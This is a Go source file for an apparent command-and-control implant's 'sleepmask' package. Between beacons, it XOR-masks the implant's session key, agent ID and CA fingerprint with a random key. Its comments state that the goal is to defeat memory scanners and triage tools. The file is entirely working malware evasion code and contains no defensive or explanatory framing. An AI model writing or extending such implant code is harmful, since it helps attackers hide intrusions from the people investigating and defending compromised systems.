// Package sleepmask masks sensitive in-memory state across beacon sleeps.
//
// Real sleepmask (the CS/sliver feature) encrypts the implant's entire
// heap across the sleep window so a scan between beacons sees opaque
// bytes. This implementation masks the critical key material — the
// session AES key, the agent ID, the CA fingerprint — which are the
// bytes a scanner or memory triage tool reads first.
//
// Mask returns the random XOR key it applied, so the caller can hand
// the same bytes to crypto.Session.MaskKey and restore both regions
// with the same key. Unmask takes the key back.
package sleepmask

import (
	"crypto/rand"
	"errors"
	"sync"
)

const keyLen = 32

// Masker holds a per-cycle random key. Zero-value is usable.
type Masker struct {
	mu sync.Mutex
}

// Mask XORs each region in place with a fresh random 32-byte key and
// returns that key. Callers pass the same key back to Unmask to
// restore. Returns an error only on a rand.Read failure.
func (m *Masker) Mask(regions ...[]byte) ([]byte, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	key := make([]byte, keyLen)
	if _, err := rand.Read(key); err != nil {
		return nil, err
	}
	for _, r := range regions {
		xorInPlace(r, key)
	}
	return key, nil
}

// Unmask restores each region with the given key. Refuses an empty
// key so an Unmask-after-failed-Mask can't silently corrupt state.
func (m *Masker) Unmask(key []byte, regions ...[]byte) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	if len(key) == 0 {
		return errors.New("sleepmask: empty key")
	}
	for _, r := range regions {
		xorInPlace(r, key)
	}
	return nil
}

func xorInPlace(data, key []byte) {
	if len(key) == 0 {
		return
	}
	for i := range data {
		data[i] ^= key[i%len(key)]
	}
}
